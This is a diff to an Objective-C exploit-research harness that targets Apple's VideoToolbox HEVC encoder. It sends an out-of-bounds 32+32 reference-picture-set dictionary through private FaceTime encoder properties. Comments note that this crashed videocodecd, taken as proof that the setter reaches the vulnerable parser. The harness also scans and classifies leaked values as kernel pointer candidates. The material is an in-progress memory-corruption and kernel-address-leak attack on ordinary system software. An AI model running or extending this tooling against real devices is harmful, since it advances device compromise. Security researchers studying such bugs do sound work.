@@ -87,16 +87,33 @@
     [report appendFormat:@"RPS: S0=%lu S1=%lu entries (OOB >16 slots)\n",
      (unsigned long)deltaS0.count, (unsigned long)deltaS1.count];
 
-    // Phase 3: gates + clean IDR first, then RPS (ollie: -19640 was validation
-    // rejecting RPS before the ST_RPS context existed; frame 0 must be a clean
-    // IDR and the enable gates must be open before any RPS reaches the parser).
-    [report appendString:@"\n--- Phase 3: enable gates + clean IDR, then RPS ---\n"];
-    OSStatus stGate1 = VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
-    OSStatus stGate2 = VTSessionSetProperty(session, CFSTR("EnableUserRPSForFaceTime"), kCFBooleanTrue);
-    [report appendFormat:@"EnableUserRefForFacetime=YES -> %d\n", (int)stGate1];
-    [report appendFormat:@"EnableUserRPSForFaceTime=YES -> %d\n", (int)stGate2];
+    // Phase 3: RPS validation ladder, NO gates (per 120328 log analysis:
+    // EnableUserRefForFacetime on this session poisons EncodeFrame (-19640 even
+    // on clean IDR) and EnableUserRPSForFaceTime is unsupported (-12900). The
+    // plain setter reaches AVE_HEVC_ST_RPS_Retrieve directly — proven by the
+    // videocodecd SIGABRT. Ladder: sane small dict first (does ANY RPS
+    // validate?), then the inflated 32+32 OOB shape).
+    [report appendString:@"\n--- Phase 3: RPS validation ladder (no gates) ---\n"];
+    NSMutableArray *s0small = [NSMutableArray array];
+    NSMutableArray *s1small = [NSMutableArray array];
+    for (int i = 0; i < 2; i++) {
+        [s0small addObject:@(-(i + 1))];
+        [s1small addObject:@(i + 1)];
+    }
+    NSDictionary *rpsSane = @{
+        @"DeltaPocS0": s0small, @"DeltaPocS1": s1small,
+        @"DeltaPOCS0Minus1": s0small, @"DeltaPOCS1Minus1": s1small,
+        @"NumNegativePics": @2, @"NumPositivePics": @2,
+        @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
+    };
+    status = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
+                                  (__bridge CFPropertyListRef)@[rpsSane]);
+    [report appendFormat:@"sane RPS (2+2) -> %d\n", (int)status];
+    status = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
+                                  (__bridge CFPropertyListRef)@[rpsDict]);
+    [report appendFormat:@"inflated RPS (32+32) -> %d\n", (int)status];
 
-    NSArray *propKeys = @[ @"UserRPSForFaceTime", @"AVEUserRPSForFaceTime", @"FaceTimeRPS" ];
+    NSArray *propKeys = @[ @"AVEUserRPSForFaceTime", @"FaceTimeRPS" ];
     NSArray *propValues = @[ @[rpsDict] ];
     for (NSString *key in propKeys) {
         for (id val in propValues) {
@@ -172,7 +189,7 @@
     ISLockFn2 isLock2 = isLib2 ? (ISLockFn2)dlsym(isLib2, "IOSurfaceLock") : NULL;
     ISUnlockFn2 isUnlock2 = isLib2 ? (ISUnlockFn2)dlsym(isLib2, "IOSurfaceUnlock") : NULL;
     ISGetBaseFn2 isGetBase2 = isLib2 ? (ISGetBaseFn2)dlsym(isLib2, "IOSurfaceGetBaseAddress") : NULL;
-    ISGetSizeFn2 isGetSize2 = isLib2 ? (ISGetSizeFn2)dlsym(isLib2, "IOSurfaceGetSize") : NULL;
+    ISGetSizeFn2 isGetSize2 = isLib2 ? (ISGetSizeFn2)dlsym(isLib2, "IOSurfaceGetAllocSize") : NULL;
 
     int ntlVals[] = { 1, 100, 16000, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
     for (int i = 0; i < 11; i++) {
@@ -415,7 +432,7 @@
         ISLockFn isLock = (ISLockFn)dlsym(isLib, "IOSurfaceLock");
         ISUnlockFn isUnlock = (ISUnlockFn)dlsym(isLib, "IOSurfaceUnlock");
         ISGetBaseFn isGetBase = (ISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress");
-        ISGetSizeFn isGetSize = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetSize");
+        ISGetSizeFn isGetSize = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize");
         if (isCreate && isLock && isUnlock && isGetBase) {
             NSDictionary *surfProps = @{
                 @"IOSurfaceWidth": @64,
@@ -627,16 +644,17 @@
     [report appendFormat:@"  filtered candidates: %lu\n", (unsigned long)kptrs2.count];
 
     int checked = 0;
+    static const char *kClsNames[] = { "PACKED_INT32", "BAD_TBI", "UNALIGNED", "ZONE_HEAP", "TEXT_DATA" };
     for (NSNumber *kpNum in kptrs2) {
         uint64_t kaddr = kpNum.unsignedLongLongValue;
         if (checked > 500) break;
         checked++;
 
-        uint64_t heapVA = 0;
-        if (KPIsPlausibleKernelHeap(kaddr, &heapVA)) {
-            if (checked <= 20) {
-                [report appendFormat:@"  candidate[%d]: raw=0x%llx va=0x%llx\n", checked, kaddr, heapVA];
-            }
+        // Per 120328 analysis: classify every candidate — the 0xffffffe0..ef
+        // band (old "heap" check) is LE int32 pairs from codec tables.
+        kptr_class_t cls = KPClassifyKPtr(kaddr);
+        if (checked <= 20) {
+            [report appendFormat:@"  candidate[%d]: raw=0x%llx %s\n", checked, kaddr, kClsNames[cls]];
         }
     }
 
